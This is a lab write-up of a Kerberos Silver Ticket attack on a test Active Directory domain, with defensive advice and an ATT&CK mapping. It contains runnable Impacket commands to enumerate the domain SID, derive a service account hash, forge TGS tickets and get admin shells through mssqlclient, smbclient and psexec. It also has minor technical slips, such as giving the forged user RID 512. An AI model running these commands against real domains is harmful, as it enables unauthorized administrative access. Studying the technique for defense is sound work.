## Overview

A **Silver Ticket** is a Kerberos credential forging attack targeting a specific service (e.g., MSSQL, CIFS/SMB, HTTP). Unlike a Golden Ticket (which requires the Domain Controller's `krbtgt` account hash to forge a Ticket Granting Ticket), a Silver Ticket is forged using the password hash or secret key of a specific **service account**.

Because service tickets (TGS) are validated locally by the target server using its own service key without contacting the Key Distribution Center (KDC/DC) for verification, an attacker who possesses the service account's key can forge a legitimate-looking TGS ticket offline to gain unauthorized administrative access to that specific service.

## Lab Setup

|**Machine / Role**|**OS / Platform**|**Function / Services**|
|---|---|---|
|**Domain Controller (DC01)**|Windows Server 2025|Active Directory, KDC, DNS (`192.168.56.107`)|
|**Attacker Workstation**|Kali Linux|Running Impacket tools (`lookupsid`, `ticketer`, `mssqlclient`)|
|**Target Service**|Windows / MSSQL Server|Target service hosted on domain `pekka.local`|

### Required Attack Prerequisites

- **Domain Name:** `pekka.local`
    
- **Target Service Account:** `sql_spn`
    
- **Service Account Key:** Derived NTLM Hash / AES Key from Kerberoasted password
    
- **Domain SID:** Discovered via SID enumeration
    
- **Target SPN:** `MSSQLSvc/sqlserver.pekka.local:1433` (or `cifs/file-server.pekka.local`)
    
- **Spoofed User & RID:** `Administrator` (RID `512` - Domain Admins)
    

## Tools Used

- **Impacket (`lookupsid.py`):** Enumerates Active Directory domain SIDs and user object RIDs over SMB/RPC.
    
- **Impacket (`ticketer.py`):** Forges offline Kerberos Ticket Granting Service (TGS) tickets using the target service account key.
    
- **Impacket (`mssqlclient.py` / `psexec.py`):** Authenticates to target services using the exported forged Kerberos ticket cache (`.ccache`).

## Attack Execution Steps

### Step 1: Enumerating the Domain SID & Account RIDs

Using valid domain user credentials (`hannibal:human123!`), an RPC SID lookup was performed against the Domain Controller (`192.168.56.107`) to extract the base Domain SID:

Bash

```shell
impacket-lookupsid 'pekka.local/hannibal:human123!@192.168.56.107'
```

#### Enumeration Output

Plaintext

```shell
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 192.168.56.107
[*] StringBinding ncacn_np:192.168.56.107[\pipe\lsarpc]
[*]==Domain SID is: S-1-5-21-1268520426-1729529555-2451300255==

500: PEKKA\Administrator (SidTypeUser)
512: PEKKA\Domain Admins (SidTypeGroup)
1150: PEKKA\sql_spn (SidTypeUser)
```

- **Extracted Domain SID:** `S-1-5-21-1268520426-1729529555-2451300255`

### Step 2: Deriving the Service Account Key (NTLM / AES)

Kerberos ticket structure relies on cryptographic keys derived from account passwords. Depending on the Active Directory domain functional level and encryption policies:

- **Why NTLM?** Legacy Windows Kerberos implementations encrypt the Service Ticket (TGS-REP) using the MD4/NTLM hash of the service account's password.
    
- **Why AES-256?** Newer OS versions (such as Windows Server 2025 / 2022) enforce AES encryption for Kerberos tickets.

#### Generating the NTLM Hash from Plaintext Password

If the password for `sql_spn` was recovered offline during Kerberoasting, calculate the NTLM hash using Python:

Bash

```shell
python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "P@ssw0rd123".encode("utf-16le")).digest()).decode())'
```

Alternatively, if AES encryption is required by domain policy, generate the AES-256 key via Impacket tools (`getkeytab.py` or `getnthash.py`).

### Step 3: Forging the Silver Ticket with `impacket-ticketer`

With the Domain SID, target SPN, and service account hash in hand, `impacket-ticketer` is executed to forge a valid TGS ticket for the `Administrator` account.

#### Command Option A (Using NTLM Hash):

Bash

```shell
impacket-ticketer -nthash <NTLM_HASH> \
  -domain-sid S-1-5-21-1268520426-1729529555-2451300255 \
  -domain pekka.local \
  -spn cifs/file-server.pekka.local Administrator
```

#### Command Option B (Using AES-256 Key for MSSQL Service):

Bash

```shell
impacket-ticketer -aesKey <AES256_KEY> \
  -domain-sid S-1-5-21-1268520426-1729529555-2451300255 \
  -domain pekka.local \
  -spn MSSQLSvc/sqlserver.pekka.local:1433 Administrator
```

This command generates an offline credential cache file: `Administrator.ccache`.

### Step 4: Importing and Executing the Silver Ticket

Export the generated `.ccache` file into the active terminal session environment variable, then authenticate using Kerberos without supplying a password:

Bash

```shell
# Export the ticket cache into memory
export KRB5CCNAME=Administrator.ccache

# Forging Access to Database Service (MSSQL)
impacket-mssqlclient sqlserver.pekka.local -k -no-pass

# Forging Access to SMB / File Share Service
smbclient //file-server.pekka.local/c$ -k -no-pass

# Executing Remote Code via PsExec (CIFS/HOST Service)
impacket-psexec pekka.local/Administrator@file-server.pekka.local -k -no-pass
```

## MITRE ATT&CK Mapping

|**Tactic**|**Technique**|**Sub-Technique / Description**|
|---|---|---|
|**Credential Access**|**[T1558 - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/)**|**[T1558.002 - Silver Ticket](https://attack.mitre.org/techniques/T1558/002/)**: Forging valid TGS tickets using stolen service account keys to bypass authentication on targeted host services.|
|**Privilege Escalation**|**[T1078 - Valid Accounts](https://attack.mitre.org/techniques/T1078/)**|**[T1078.002 - Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)**: Accessing service endpoints disguised as high-privilege administrative users (e.g., `Administrator` / RID `512`).|
|**Discovery**|**[T1087 - Account Discovery](https://attack.mitre.org/techniques/T1087/)**|**[T1087.002 - Domain Account](https://attack.mitre.org/techniques/T1087/002/)**: Utilizing `impacket-lookupsid` to map domain SIDs and user object RIDs.|

## Defensive Recommendations & Mitigation

- **Group Managed Service Accounts (gMSA):** Migrate service accounts to gMSAs where passwords are 128 characters long and rotate automatically every 30 days, making key extraction and ticket forging impossible.
    
- **KDC PAC Validation Enforcement:** Enable strict KDC PAC signature validation so target host services reject locally forged tickets that lack authentic DC signatures.
    
- **Audit Host Event Logs:**
    
    - Monitor host-level **Security Event ID 4624** (_An account was successfully logged on_) and **Event ID 4672** (_Special privileges assigned to new logon_).
        
    - Check for anomalous service ticket logons where the KDC did not log a matching **Event ID 4769** (_TGS ticket requested_).
        

## Verification Checklist

[x] Domain SID (`S-1-5-21-...`) enumerated successfully using `impacket-lookupsid`.
    
[x] Cryptographic service key derived for target service account (`sql_spn`).
    
[x] Offline TGS ticket forged for `Administrator` using `impacket-ticketer`.
    
[x] Kerberos ticket cache (`KRB5CCNAME`) successfully imported into terminal environment.
    
[x] Authenticated to target service without entering a password (`-k -no-pass`).